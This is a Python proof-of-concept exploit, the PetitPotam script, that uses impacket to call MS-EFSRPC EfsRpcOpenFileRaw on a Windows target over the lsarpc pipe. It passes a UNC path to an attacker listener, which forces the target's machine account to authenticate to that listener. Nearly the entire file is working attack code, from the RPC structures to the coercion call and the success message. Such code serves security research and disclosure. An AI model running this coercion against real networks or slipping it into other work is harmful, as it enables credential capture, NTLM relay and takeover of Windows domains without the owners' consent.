#!/usr/bin/env python
# 
# Author: GILLES Lionel aka topotam (@topotam77)
# 
# Greetz : grenadine(@Greynardine), skar(@__skar), didakt(@inf0sec1), plissken, pixis(@HackAndDo), shutd0wn(@ _nwodtuhs)
# "Most of" the code stolen from dementor.py from @3xocyte ;)


import sys
import logging
import argparse

from struct import unpack
from impacket import version, system_errors, LOG
from impacket.dcerpc.v5 import transport
from impacket.structure import hexdump
from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT
from impacket.dcerpc.v5.dtypes import UUID, ULONG, WSTR
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.uuid import uuidtup_to_bin


show_banner = '''
                                                                                               
              ___            _        _      _        ___            _                     
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
                                         
PoC to connect to lsarpc and elicit machine account authentication via MS-EFSRPC EfsRpcOpenFileRaw()
                                      by topotam (@topotam77)
      
                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN


'''

class DCERPCSessionError(DCERPCException):
    def __init__(self, error_string=None, error_code=None, packet=None):
        DCERPCException.__init__(self, error_string, error_code, packet)

    def __str__( self ):
        key = self.error_code
        if key in system_errors.ERROR_MESSAGES:
            error_msg_short = system_errors.ERROR_MESSAGES[key][0]
            error_msg_verbose = system_errors.ERROR_MESSAGES[key][1]
            return 'EFSR SessionError: code: 0x%x - %s - %s' % (self.error_code, error_msg_short, error_msg_verbose)
        else:
            return 'EFSR SessionError: unknown error code: 0x%x' % self.error_code


################################################################################
# STRUCTURES
################################################################################

class EXIMPORT_CONTEXT_HANDLE(NDRSTRUCT):
    align = 1
    structure = (
        ('Data', '20s'),
    )

################################################################################
# RPC CALLS
################################################################################
class GEfsRpcOpenFileRaw(NDRCALL):
    opnum = 0
    structure = (
        ('fileName', WSTR), 
        ('Flag', ULONG),
    )
    
class GEfsRpcOpenFileRawResponse(NDRCALL):
    structure = (
        ('hContext', EXIMPORT_CONTEXT_HANDLE),
        ('ErrorCode', ULONG),
    )

################################################################################
# OPNUMs and their corresponding structures
################################################################################
OPNUMS = {
 0 : (GEfsRpcOpenFileRaw, GEfsRpcOpenFileRawResponse),

}
 
class CoerceAuth():
    
    
    
    def connect(self, username, password, domain, nthash, target):

        stringBinding = r'ncacn_np:%s[\PIPE\lsarpc]' % target # possible aussi via efsrpc (en changeant d'UUID) mais ce named pipe est moins universel et plus rare que lsarpc ;)
        MSRPC_UUID_EFSR = uuidtup_to_bin(('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')) # for LSARPC named pipe ;)

        rpctransport = transport.DCERPCTransportFactory(stringBinding)
        if hasattr(rpctransport, 'set_credentials'):
            rpctransport.set_credentials(username, password, domain, nthash)
        dce = rpctransport.get_dce_rpc()
        #dce.set_auth_type(RPC_C_AUTHN_WINNT)
        #dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        print("[-] Connecting to %s!" % target)
        try:
            dce.connect()
        except Exception as e:
            print("Something went wrong, check error status => %s" % str(e))  
            sys.exit()
        print("[+] Connected!")
        print("[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e !")
        try:
            dce.bind(MSRPC_UUID_EFSR)
        except Exception as e:
            print("Something went wrong, check error status => %s" % str(e)) 
            sys.exit()
        print("[+] Succesfully Bound!")
        return dce


    def GEfsRpcOpenFileRaw(self, dce, listener):
        print("[-] Sending GEfsRpcOpenFileRaw!")
        try:
            request = GEfsRpcOpenFileRaw()
            request['fileName'] = '\\\\%s\\c$\\Settings.ini\x00' % listener
            request['Flag'] = 0
            #request.dump()
            resp = dce.request(request)
            
        except Exception as e:
            if str(e).find('ERROR_BAD_NETPATH') >= 0:
                print('[+] Got expected ERROR_BAD_NETPATH exception!!')
                print('[+] Attack worked!')
                pass
            else:
                print("Something went wrong, check error status => %s" % str(e)) 
                sys.exit()
def main():

    
    global target
    global listener
    

    parser = argparse.ArgumentParser(add_help = True, description = "PetitPotam - rough PoC to connect to lsarpc and elicit machine account authentication via MS-EFSRPC EfsRpcOpenFileRaw()")
    parser.add_argument('-u', '--username', action="store", default='', help='valid username')
    parser.add_argument('-p', '--password', action="store", default='', help='valid password')
    parser.add_argument('-d', '--domain', action="store", default='', help='valid domain name')
    parser.add_argument('--ntlm', action="store", default='', help='nt hash')
    parser.add_argument('listener', help='ip address or hostname of listener')
    parser.add_argument('target', help='ip address or hostname of target')

    options = parser.parse_args()

    domain = options.domain
    username = options.username
    password = options.password
    ntlm = options.ntlm
    listener = options.listener
    target = options.target
   
      
    print(show_banner)
    
    plop = CoerceAuth()
    dce = plop.connect(username, password, domain, ntlm, target)
    plop.GEfsRpcOpenFileRaw(dce, listener)

    
    dce.disconnect()
    sys.exit()   
             
if __name__ == '__main__':
    main()
